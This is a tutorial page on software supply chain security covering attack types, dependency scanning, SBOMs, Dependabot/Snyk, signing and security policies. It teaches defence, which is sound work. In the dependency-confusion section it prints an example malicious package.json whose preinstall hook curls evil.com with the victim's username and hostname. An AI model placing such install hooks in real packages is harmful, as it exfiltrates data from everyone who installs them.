---
title: 软件供应链安全
description: 学习软件供应链安全和依赖管理
track: security
section: appsec
difficulty: intermediate
tags:
  - 供应链安全
  - 依赖
  - SBOM
  - 漏洞扫描
status: imported
origin: old/src/content/docs/security/supply-chain.en.md
divergence: 0.21
issues:
  - title-lang-en
  - title-language
legacy:
  category: Security
  subcategory: AppSec
  order: 19
  lastUpdated: 2026-01-07
---

Software supply chain security has become one of the most critical areas of modern application security. With the widespread use of open-source software, a typical application may contain hundreds or even thousands of third-party dependencies. If any one of these dependencies is compromised, it could threaten the security of the entire application. From the SolarWinds incident to the Log4Shell vulnerability, supply chain attacks have proven their devastating potential. This article covers various aspects of software supply chain security to help you build a secure and reliable software supply chain.

## Supply Chain Risk Overview

### Software Supply Chain Attack Surface

Modern software development supply chains involve multiple stages, each of which can become an attack target:

```
┌─────────────────────────────────────────────────────────────────┐
│                  Software Supply Chain Attack Surface            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │  Source Code  │  │  Build Layer │  │ Distribution │           │
│  │    Layer      │  │              │  │    Layer     │           │
│  ├──────────────┤  ├──────────────┤  ├──────────────┤           │
│  │ • Malicious   │  │ • Build      │  │ • Repository │           │
│  │   commits     │  │   system     │  │   hijacking  │           │
│  │ • Dependency  │  │   compromise │  │ • Package    │           │
│  │   confusion   │  │ • CI/CD      │  │   replacement│           │
│  │ • Typosquatting│ │   injection  │  │ • CDN        │           │
│  │ • Account     │  │ • Compiler   │  │   hijacking  │           │
│  │   hijacking   │  │   backdoors  │  │ • Mirror     │           │
│  │              │  │ • Build script│  │   poisoning  │           │
│  │              │  │   tampering  │  │              │           │
│  └──────────────┘  └──────────────┘  └──────────────┘           │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │ Dependency   │  │  Runtime     │  │  Update      │           │
│  │   Layer      │  │   Layer      │  │   Layer      │           │
│  ├──────────────┤  ├──────────────┤  ├──────────────┤           │
│  │ • Malicious  │  │ • Dynamic    │  │ • Auto-update│           │
│  │   dependencies│ │   loading    │  │   hijacking  │           │
│  │ • Transitive │  │   attacks    │  │ • Version    │           │
│  │   dependency │  │ • Plugin     │  │   rollback   │           │
│  │   vulnerabilities│ │   injection│  │   attacks    │           │
│  │ • License    │  │ • Config     │  │ • Update     │           │
│  │   risks      │  │   injection  │  │   server     │           │
│  └──────────────┘  └──────────────┘  │   compromise │           │
│                                       └──────────────┘           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Common Supply Chain Attack Types

#### Dependency Confusion Attack

Attackers publish malicious packages with the same name as internal packages in public package repositories, exploiting package manager priority rules:

```
Attack Flow:
1. Attacker discovers target company uses private package "company-utils"
2. Publishes same-named package "company-utils" on npm/PyPI public repository
3. Sets higher version number (e.g., 99.0.0)
4. Developer runs npm install, package manager prioritizes fetching public higher version
5. Malicious code executes during installation, stealing sensitive information
```

```javascript
// Example malicious package package.json
{
  "name": "company-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://evil.com/collect?data=$(whoami)@$(hostname)"
  }
}
```

#### Typosquatting Attack

Attackers register malicious packages with names similar to popular packages:

```
Common Typosquatting Examples:
Correct Package Name    Malicious Package Name
lodash                  lodahs, lodash-utils, 1odash
express                 expres, expresss, express-js
requests (Python)       request, requets
```

#### Malicious Maintainer Attack

Attackers take over legitimate package maintenance permissions and inject malicious code:

```
Attack Chain:
1. Attacker obtains maintainer's npm/PyPI account credentials through phishing
2. Or convinces original maintainer to transfer project ownership
3. Publishes new version containing malicious code
4. All projects using this package get infected during updates
```

### Real Case Studies

#### SolarWinds Supply Chain Attack (2020)

```
Attack Scale: Affected over 18,000 organizations, including US government agencies

Attack Process:
1. Attackers compromised SolarWinds' build system
2. Injected backdoor during Orion software build process
3. Backdoor distributed to customers through normal software updates
4. Malicious code disguised as legitimate network traffic, difficult to detect

Lessons Learned:
- Need to protect the entire build pipeline
- Code signing cannot prevent build-time injection
- Need multi-layered defense and detection mechanisms
```

#### Log4Shell Vulnerability (CVE-2021-44228)

```
Impact: Millions of Java applications worldwide

Vulnerability Details:
- JNDI injection vulnerability in Log4j 2.x versions
- Allows remote code execution
- Exists as transitive dependency in numerous projects

Lessons Learned:
- Transitive dependencies are also important attack surfaces
- Need complete dependency inventory (SBOM)
- Vulnerability response requires rapid identification of affected systems
```

## Dependency Scanning

### Open Source Dependency Scanning Tools

#### npm audit

```bash
# Check npm project for vulnerabilities
npm audit

# Generate detailed JSON report
npm audit --json > audit-report.json

# Automatically fix fixable vulnerabilities
npm audit fix

# Force update major versions (may break compatibility)
npm audit fix --force

# Only check production dependency vulnerabilities
npm audit --production
```

#### Snyk CLI

```bash
# Install Snyk CLI
npm install -g snyk

# Authenticate
snyk auth

# Test project for vulnerabilities
snyk test

# Continuously monitor project
snyk monitor

# Test specific package
snyk test express@4.17.1

# Test Docker image
snyk container test myapp:latest

# Test infrastructure as code
snyk iac test kubernetes/

# Generate HTML report
snyk test --json | snyk-to-html -o results.html
```

#### OWASP Dependency-Check

```bash
# Run using Docker
docker run --rm \
    -v $(pwd):/src \
    -v $(pwd)/reports:/reports \
    owasp/dependency-check \
    --scan /src \
    --format "HTML" \
    --project "MyProject" \
    --out /reports

# Maven integration
mvn org.owasp:dependency-check-maven:check

# Gradle integration
./gradlew dependencyCheckAnalyze
```

```xml
<!-- Maven pom.xml configuration -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFile>suppression.xml</suppressionFile>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### CI/CD Integration Scanning

#### GitHub Actions Integration

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    # Run daily at 2 AM
    - cron: '0 2 * * *'

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      # npm audit scan
      - name: Run npm audit
        run: npm audit --audit-level=high

      # Snyk scan
      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      # Trivy filesystem scan
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'

  container-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Scan Docker image with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy scan results to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'
```

#### GitLab CI/CD Integration

```yaml
# .gitlab-ci.yml
stages:
  - test
  - security
  - build

variables:
  SECURE_LOG_LEVEL: info

# Dependency scanning
dependency_scanning:
  stage: security
  image: node:20-alpine
  script:
    - npm ci
    - npm audit --json > npm-audit.json || true
  artifacts:
    reports:
      dependency_scanning: npm-audit.json
    paths:
      - npm-audit.json

# Trivy container scanning
container_scanning:
  stage: security
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    - trivy image --exit-code 0 --severity HIGH,CRITICAL --format json -o trivy-report.json $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    reports:
      container_scanning: trivy-report.json

# SAST static analysis
sast:
  stage: security
  image: returntocorp/semgrep
  script:
    - semgrep --config=auto --json --output=semgrep-report.json .
  artifacts:
    reports:
      sast: semgrep-report.json
```

### Vulnerability Priority Assessment

```python
# Vulnerability priority assessment script example
import json
from dataclasses import dataclass
from enum import Enum

class Severity(Enum):
    CRITICAL = 4
    HIGH = 3
    MEDIUM = 2
    LOW = 1

class Exploitability(Enum):
    ACTIVELY_EXPLOITED = 4
    POC_AVAILABLE = 3
    THEORETICAL = 2
    UNKNOWN = 1

@dataclass
class Vulnerability:
    cve_id: str
    severity: Severity
    cvss_score: float
    exploitability: Exploitability
    is_direct_dependency: bool
    has_fix_available: bool
    affected_component: str

def calculate_priority_score(vuln: Vulnerability) -> float:
    """Calculate vulnerability priority score"""
    base_score = vuln.cvss_score

    # Exploitability weighting
    exploitability_weight = {
        Exploitability.ACTIVELY_EXPLOITED: 2.0,
        Exploitability.POC_AVAILABLE: 1.5,
        Exploitability.THEORETICAL: 1.0,
        Exploitability.UNKNOWN: 0.8,
    }
    base_score *= exploitability_weight[vuln.exploitability]

    # Prioritize direct dependencies
    if vuln.is_direct_dependency:
        base_score *= 1.3

    # Prioritize those with available fixes (easier to remediate)
    if vuln.has_fix_available:
        base_score *= 1.2

    return min(base_score, 10.0)  # Maximum score 10

def prioritize_vulnerabilities(vulns: list[Vulnerability]) -> list[Vulnerability]:
    """Sort vulnerability list by priority"""
    return sorted(vulns, key=lambda v: calculate_priority_score(v), reverse=True)

# Usage example
vulnerabilities = [
    Vulnerability(
        cve_id="CVE-2021-44228",
        severity=Severity.CRITICAL,
        cvss_score=10.0,
        exploitability=Exploitability.ACTIVELY_EXPLOITED,
        is_direct_dependency=False,
        has_fix_available=True,
        affected_component="log4j-core"
    ),
    Vulnerability(
        cve_id="CVE-2023-12345",
        severity=Severity.HIGH,
        cvss_score=7.5,
        exploitability=Exploitability.POC_AVAILABLE,
        is_direct_dependency=True,
        has_fix_available=True,
        affected_component="express"
    ),
]

prioritized = prioritize_vulnerabilities(vulnerabilities)
for vuln in prioritized:
    print(f"{vuln.cve_id}: Priority score {calculate_priority_score(vuln):.2f}")
```

## Software Bill of Materials (SBOM)

### SBOM Overview

A Software Bill of Materials (SBOM) is a complete inventory of software components, similar to a bill of materials in manufacturing. SBOM is crucial for supply chain security:

```
Value of SBOM:
1. Vulnerability Response - Quickly identify affected components
2. License Compliance - Track open source license obligations
3. Supply Chain Transparency - Understand complete software composition
4. Risk Assessment - Evaluate risks of third-party components
5. Regulatory Compliance - Meet government and industry requirements
```

### SBOM Format Standards

#### SPDX (Software Package Data Exchange)

```json
{
  "spdxVersion": "SPDX-2.3",
  "dataLicense": "CC0-1.0",
  "SPDXID": "SPDXRef-DOCUMENT",
  "name": "myapp-sbom",
  "documentNamespace": "https://example.com/myapp-1.0.0",
  "creationInfo": {
    "created": "2024-01-15T10:00:00Z",
    "creators": [
      "Tool: syft-0.100.0",
      "Organization: Example Corp"
    ]
  },
  "packages": [
    {
      "SPDXID": "SPDXRef-Package-npm-express-4.18.2",
      "name": "express",
      "versionInfo": "4.18.2",
      "packageFileName": "express-4.18.2.tgz",
      "downloadLocation": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "checksums": [
        {
          "algorithm": "SHA256",
          "checksumValue": "abc123..."
        }
      ],
      "licenseConcluded": "MIT",
      "licenseDeclared": "MIT",
      "copyrightText": "Copyright (c) 2009-2014 TJ Holowaychuk",
      "externalRefs": [
        {
          "referenceCategory": "PACKAGE-MANAGER",
          "referenceType": "npm",
          "referenceLocator": "express@4.18.2"
        },
        {
          "referenceCategory": "SECURITY",
          "referenceType": "cpe23Type",
          "referenceLocator": "cpe:2.3:a:expressjs:express:4.18.2:*:*:*:*:node.js:*:*"
        }
      ]
    }
  ],
  "relationships": [
    {
      "spdxElementId": "SPDXRef-DOCUMENT",
      "relatedSpdxElement": "SPDXRef-Package-npm-express-4.18.2",
      "relationshipType": "DESCRIBES"
    }
  ]
}
```

#### CycloneDX

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "serialNumber": "urn:uuid:3e671687-395b-41f5-a30f-a58921a69b79",
  "version": 1,
  "metadata": {
    "timestamp": "2024-01-15T10:00:00Z",
    "tools": [
      {
        "vendor": "Anchore",
        "name": "syft",
        "version": "0.100.0"
      }
    ],
    "component": {
      "type": "application",
      "name": "myapp",
      "version": "1.0.0"
    }
  },
  "components": [
    {
      "type": "library",
      "bom-ref": "pkg:npm/express@4.18.2",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2",
      "licenses": [
        {
          "license": {
            "id": "MIT"
          }
        }
      ],
      "hashes": [
        {
          "alg": "SHA-256",
          "content": "abc123..."
        }
      ],
      "externalReferences": [
        {
          "type": "website",
          "url": "https://expressjs.com"
        },
        {
          "type": "vcs",
          "url": "https://github.com/expressjs/express"
        }
      ]
    }
  ],
  "dependencies": [
    {
      "ref": "pkg:npm/myapp@1.0.0",
      "dependsOn": [
        "pkg:npm/express@4.18.2"
      ]
    }
  ],
  "vulnerabilities": [
    {
      "id": "CVE-2024-12345",
      "source": {
        "name": "NVD",
        "url": "https://nvd.nist.gov/"
      },
      "ratings": [
        {
          "source": {
            "name": "NVD"
          },
          "score": 7.5,
          "severity": "high",
          "method": "CVSSv31"
        }
      ],
      "affects": [
        {
          "ref": "pkg:npm/express@4.18.2"
        }
      ]
    }
  ]
}
```

### SBOM Generation Tools

#### Syft - Multi-language SBOM Generator

```bash
# Install Syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Generate SBOM from directory
syft dir:./myapp -o spdx-json > sbom.spdx.json

# Generate SBOM from container image
syft myapp:latest -o cyclonedx-json > sbom.cdx.json

# Supports multiple output formats
syft . -o spdx              # SPDX tag-value
syft . -o spdx-json         # SPDX JSON
syft . -o cyclonedx         # CycloneDX XML
syft . -o cyclonedx-json    # CycloneDX JSON
syft . -o table             # Human-readable table
syft . -o json              # Syft native JSON

# Generate SBOM from Dockerfile
syft docker:myapp:latest -o cyclonedx-json
```

#### Using Grype for SBOM Vulnerability Scanning

```bash
# Install Grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Directly scan directory
grype dir:./myapp

# Scan using SBOM
grype sbom:sbom.cdx.json

# Show only high-severity vulnerabilities
grype sbom:sbom.cdx.json --only-fixed --fail-on high

# Output JSON format
grype sbom:sbom.cdx.json -o json > vulnerabilities.json
```

### SBOM Management Workflow

```yaml
# GitHub Actions SBOM generation and management workflow
name: SBOM Management

on:
  push:
    branches: [main]
  release:
    types: [published]

jobs:
  generate-sbom:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Install Syft
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

      - name: Generate SBOM
        run: |
          syft dir:. -o spdx-json > sbom.spdx.json
          syft dir:. -o cyclonedx-json > sbom.cdx.json

      - name: Install Grype
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

      - name: Scan SBOM for vulnerabilities
        run: |
          grype sbom:sbom.cdx.json -o json > vulnerability-report.json

      - name: Upload SBOM as artifact
        uses: actions/upload-artifact@v3
        with:
          name: sbom
          path: |
            sbom.spdx.json
            sbom.cdx.json
            vulnerability-report.json

      - name: Attach SBOM to release
        if: github.event_name == 'release'
        uses: softprops/action-gh-release@v1
        with:
          files: |
            sbom.spdx.json
            sbom.cdx.json
```

## Dependabot and Snyk

### GitHub Dependabot Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  # npm dependency updates
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "Asia/Shanghai"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    # Ignore major version updates for specific dependencies
    ignore:
      - dependency-name: "lodash"
        update-types: ["version-update:semver-major"]
    # Group security updates
    groups:
      security-updates:
        applies-to: security-updates
        patterns:
          - "*"
      minor-updates:
        applies-to: version-updates
        update-types:
          - "minor"
          - "patch"

  # Docker image updates
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "docker"
      - "dependencies"

  # GitHub Actions updates
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "ci"
      - "dependencies"

  # Python dependency updates
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    # Prioritize security updates
    open-pull-requests-limit: 5
    # Use requirements.txt
    allow:
      - dependency-type: "direct"
```

### Snyk Configuration

```yaml
# .snyk policy file
version: v1.25.0
language-settings:
  python:
    # Python version
    python: "3.11"
ignore:
  # Ignore specific vulnerability until specified date
  SNYK-JS-LODASH-1018905:
    - '*':
        reason: 'Waiting for upstream fix, mitigation in place'
        expires: 2024-06-01T00:00:00.000Z

  # Ignore vulnerabilities in test dependencies
  SNYK-JS-JEST-1234567:
    - 'jest > *':
        reason: 'Only affects development environment'

patch:
  # Apply Snyk patches
  SNYK-JS-LODASH-567890:
    - lodash:
        patched: '2024-01-15T00:00:00.000Z'
```

```javascript
// snyk.config.js - Snyk advanced configuration
module.exports = {
  // Custom severity threshold
  severity: 'high',

  // Excluded paths
  exclude: [
    'test/',
    'docs/',
    '__mocks__/'
  ],

  // Policy path
  'policy-path': '.snyk',

  // Project name
  'project-name': 'myapp-production',

  // Organization settings
  org: 'my-org',

  // Remote repository URL
  'remote-repo-url': 'https://github.com/myorg/myapp',

  // Custom rules
  rules: {
    'no-vulnerable-packages': {
      severity: 'error',
      cvss: {
        min: 7.0
      }
    }
  }
};
```

### Automated Fix Workflow

```yaml
# .github/workflows/auto-fix-vulnerabilities.yml
name: Auto Fix Vulnerabilities

on:
  schedule:
    - cron: '0 6 * * 1'  # Every Monday at 6 AM
  workflow_dispatch:

jobs:
  auto-fix:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.PAT_TOKEN }}

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: Run npm audit fix
        run: |
          npm audit fix --force || true

      - name: Run Snyk fix
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          npx snyk wizard --trust-policies || true

      - name: Check for changes
        id: git-check
        run: |
          git diff --exit-code || echo "changes=true" >> $GITHUB_OUTPUT

      - name: Create Pull Request
        if: steps.git-check.outputs.changes == 'true'
        uses: peter-evans/create-pull-request@v5
        with:
          token: ${{ secrets.PAT_TOKEN }}
          commit-message: 'fix: Auto-fix security vulnerabilities'
          title: '[Security] Automated Security Vulnerability Fix'
          body: |
            ## Automated Security Fix

            This PR was created by an automated workflow and includes the following fixes:
            - Fixes from npm audit fix
            - Fixes recommended by Snyk

            Please review changes and ensure all tests pass.
          branch: auto-security-fix
          labels: |
            security
            automated
```

## Package Signing

### npm Package Signing

```bash
# npm package signing and verification (using Sigstore)

# Publish signed package
npm publish --provenance

# Verify package provenance
npm audit signatures

# View package signature information
npm view express signatures
```

```json
// Enable provenance in package.json
{
  "name": "my-package",
  "version": "1.0.0",
  "publishConfig": {
    "provenance": true
  }
}
```

### Container Image Signing with Cosign

```bash
# Install Cosign
curl -sSfL https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64 -o /usr/local/bin/cosign
chmod +x /usr/local/bin/cosign

# Generate key pair
cosign generate-key-pair

# Sign container image
cosign sign --key cosign.key myregistry.io/myapp:v1.0.0

# Keyless signing (using OIDC identity)
cosign sign myregistry.io/myapp:v1.0.0

# Verify image signature
cosign verify --key cosign.pub myregistry.io/myapp:v1.0.0

# Verify image signed using Sigstore public instance
cosign verify \
  --certificate-identity=user@example.com \
  --certificate-oidc-issuer=https://accounts.google.com \
  myregistry.io/myapp:v1.0.0

# Add signature annotations
cosign sign --key cosign.key \
  -a "commit=$(git rev-parse HEAD)" \
  -a "build-time=$(date -u +'%Y-%m-%dT%H:%M:%SZ')" \
  myregistry.io/myapp:v1.0.0

# Verify annotations
cosign verify --key cosign.pub \
  -a "commit=abc123" \
  myregistry.io/myapp:v1.0.0
```

### Kubernetes Image Signature Verification

```yaml
# Using Sigstore Policy Controller for signature verification
apiVersion: policy.sigstore.dev/v1alpha1
kind: ClusterImagePolicy
metadata:
  name: require-signed-images
spec:
  images:
    - glob: "myregistry.io/**"
  authorities:
    - keyless:
        identities:
          - issuer: https://accounts.google.com
            subject: deploy@mycompany.iam.gserviceaccount.com
    - key:
        data: |
          -----BEGIN PUBLIC KEY-----
          MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
          -----END PUBLIC KEY-----
---
# Namespace-level policy
apiVersion: policy.sigstore.dev/v1alpha1
kind: ImagePolicy
metadata:
  name: production-policy
  namespace: production
spec:
  images:
    - glob: "*"
  authorities:
    - keyless:
        identities:
          - issuer: https://github.com/login/oauth
            subject: https://github.com/myorg/myrepo/.github/workflows/build.yml@refs/heads/main
```

### Git Commit Signing

```bash
# Configure GPG signing
git config --global user.signingkey YOUR_GPG_KEY_ID
git config --global commit.gpgsign true

# Create signed commit
git commit -S -m "feat: Add new feature"

# Create signed tag
git tag -s v1.0.0 -m "Release v1.0.0"

# Verify commit signature
git verify-commit HEAD
git log --show-signature

# Verify tag signature
git verify-tag v1.0.0
```

```yaml
# Using GPG signing in GitHub Actions
name: Release

on:
  push:
    tags:
      - 'v*'

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Import GPG key
        uses: crazy-max/ghaction-import-gpg@v6
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.GPG_PASSPHRASE }}
          git_user_signingkey: true
          git_commit_gpgsign: true

      - name: Create signed release
        run: |
          git tag -s -f ${{ github.ref_name }} -m "Release ${{ github.ref_name }}"
          git push --tags --force
```

## Security Policies

### Dependency Management Policy

```yaml
# dependency-policy.yaml - Dependency management policy definition
apiVersion: security.example.com/v1
kind: DependencyPolicy
metadata:
  name: production-dependency-policy
spec:
  # Allowed dependency sources
  allowedSources:
    - registry: "https://registry.npmjs.org"
      scope: "@company/*"
      requireSignature: true
    - registry: "https://npm.pkg.github.com"
      scope: "*"
      requireSignature: true

  # Blocked dependencies
  blockedPackages:
    - name: "event-stream"
      reason: "Historical malicious code injection"
    - name: "colors"
      version: ">1.4.0"
      reason: "Maintainer intentional sabotage"

  # License policy
  licensePolicy:
    allowed:
      - MIT
      - Apache-2.0
      - BSD-2-Clause
      - BSD-3-Clause
      - ISC
    denied:
      - GPL-3.0
      - AGPL-3.0
      - SSPL-1.0
    requireReview:
      - LGPL-2.1
      - MPL-2.0

  # Vulnerability policy
  vulnerabilityPolicy:
    # Severity level that blocks deployment
    blockOnSeverity: high
    # Maximum allowed vulnerability count
    maxAllowedVulnerabilities:
      critical: 0
      high: 0
      medium: 5
      low: 20
    # Exemption list
    exemptions:
      - cve: "CVE-2021-12345"
        expiry: "2024-06-01"
        reason: "Waiting for upstream fix"
        ticket: "JIRA-1234"

  # Dependency update policy
  updatePolicy:
    # Auto-merge security updates
    autoMergeSecurityUpdates: true
    # Update types requiring code review
    requireReview:
      - major
      - security
    # Update frequency
    updateFrequency: weekly
```

### Security Gate Configuration

```yaml
# .github/workflows/security-gate.yml
name: Security Gate

on:
  pull_request:
    branches: [main, release/*]

jobs:
  security-checks:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Dependency License Check
        uses: fossa-contrib/fossa-action@v2
        with:
          api-key: ${{ secrets.FOSSA_API_KEY }}

      - name: Check for blocked dependencies
        run: |
          # Check if blocked dependencies are present
          BLOCKED_DEPS=("event-stream" "colors@2" "ua-parser-js@0.7.29")
          for dep in "${BLOCKED_DEPS[@]}"; do
            if grep -q "$dep" package-lock.json; then
              echo "Error: Blocked dependency found $dep"
              exit 1
            fi
          done

      - name: SBOM Generation and Validation
        run: |
          syft dir:. -o cyclonedx-json > sbom.json
          # Verify SBOM integrity
          grype sbom:sbom.json --fail-on high

      - name: Vulnerability Threshold Check
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          snyk test --severity-threshold=high --json > snyk-report.json || true

          # Check vulnerability count
          CRITICAL=$(jq '.vulnerabilities | map(select(.severity=="critical")) | length' snyk-report.json)
          HIGH=$(jq '.vulnerabilities | map(select(.severity=="high")) | length' snyk-report.json)

          if [ "$CRITICAL" -gt 0 ]; then
            echo "Error: Found $CRITICAL critical vulnerabilities"
            exit 1
          fi

          if [ "$HIGH" -gt 5 ]; then
            echo "Error: High severity vulnerability count exceeds threshold ($HIGH > 5)"
            exit 1
          fi

      - name: Container Image Signature Verification
        if: contains(github.event.pull_request.labels.*.name, 'container')
        run: |
          cosign verify --key cosign.pub ${{ env.IMAGE_REF }} || exit 1
```

### Incident Response Process

```markdown
# Supply Chain Security Incident Response Process

## Detection and Alerting
- Monitor security advisories and vulnerability databases
- Configure automated scanning and alerting
- Subscribe to security notifications for critical dependencies

## Assess Impact Scope
- Use SBOM to quickly identify affected systems
- Determine if vulnerability is being exploited in production
- Assess data breach risk

## Containment Measures
- If actively exploited, consider temporarily taking affected systems offline
- Block further vulnerability exploitation
- Preserve evidence for subsequent analysis

## Remediation and Recovery
- Update affected dependencies
- If no patch available, implement temporary mitigation measures
- Conduct thorough testing after deploying fixes

## Post-Incident Review
- Document incident timeline
- Analyze root causes
- Update security policies and processes
```

```yaml
# incident-response.yaml - Incident response automation
name: Security Incident Response

on:
  repository_dispatch:
    types: [security-incident]

jobs:
  respond:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Analyze impact
        run: |
          # Get SBOM
          syft dir:. -o cyclonedx-json > sbom.json

          # Check affected components
          AFFECTED_CVE="${{ github.event.client_payload.cve }}"
          grype sbom:sbom.json --only-fixed | grep "$AFFECTED_CVE" > impact-report.txt

      - name: Create incident issue
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const impact = fs.readFileSync('impact-report.txt', 'utf8');

            await github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: `[Security Incident] ${{ github.event.client_payload.cve }}`,
              body: `## Security Incident Notification\n\nCVE: ${{ github.event.client_payload.cve }}\nSeverity: ${{ github.event.client_payload.severity }}\n\n### Impact Analysis\n\`\`\`\n${impact}\n\`\`\`\n\n### Next Steps\n- [ ] Assess actual impact\n- [ ] Test fix version\n- [ ] Deploy fix\n- [ ] Verify fix`,
              labels: ['security', 'incident', 'priority-high']
            });

      - name: Notify security team
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "Security Incident Alert",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*Security Incident*: ${{ github.event.client_payload.cve }}\n*Severity*: ${{ github.event.client_payload.severity }}"
                  }
                }
              ]
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_SECURITY_WEBHOOK }}
```

## Interview Key Points

### Core Concept Questions

**Q1: What is a software supply chain attack? List common attack types.**

```
Answer Key Points:

1. Definition:
   - Attacking end users by compromising any stage of software development, build, or distribution
   - Exploiting software dependency relationships and trust chains

2. Common Attack Types:
   - Dependency Confusion
   - Typosquatting (package name impersonation)
   - Malicious maintainer attacks
   - Build system compromise
   - Certificate/signing key leakage
   - Third-party service compromise

3. Notable Cases:
   - SolarWinds (2020)
   - Codecov (2021)
   - Log4Shell (2021)
   - ua-parser-js incident (2021)
```

**Q2: What is SBOM? Why is it important for supply chain security?**

```
Answer Key Points:

1. SBOM Definition:
   - Software Bill of Materials
   - Complete inventory of software components including versions, licenses, sources, etc.

2. Main Formats:
   - SPDX (Linux Foundation)
   - CycloneDX (OWASP)
   - SWID Tags

3. Importance:
   - Quickly identify systems affected by vulnerabilities
   - License compliance management
   - Supply chain transparency
   - Regulatory compliance (e.g., US Executive Order 14028)
   - Risk assessment and management

4. Generation Tools:
   - Syft, Trivy, cyclonedx-cli
```

**Q3: How to prevent dependency confusion attacks?**

```
Answer Key Points:

1. Configure private repository priority:
   - npm: Configure registry in .npmrc
   - pip: Use --index-url and --extra-index-url
   - Maven: Configure mirror priority

2. Use namespaces/scopes:
   - npm: @company/package-name
   - Python: Use private namespaces

3. Lock dependency versions:
   - Use lock files
   - Pin exact version numbers

4. Package integrity verification:
   - Verify package hash/signature
   - Use Subresource Integrity

5. Repository configuration:
   - Reserve public package names in private repository
   - Use repository proxy instead of direct access to public repositories
```

### Practical Scenario Questions

**Q4: Design a complete dependency security scanning workflow**

```yaml
# Answer Example: Comprehensive dependency security scanning CI/CD workflow

name: Comprehensive Dependency Security

on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: '0 2 * * *'

jobs:
  # Stage 1: Dependency Audit
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: npm audit
        run: npm audit --audit-level=moderate

      - name: License check
        run: npx license-checker --production --onlyAllow "MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC"

  # Stage 2: SBOM Generation
  generate-sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          format: cyclonedx-json
          output-file: sbom.cdx.json

      - name: Upload SBOM
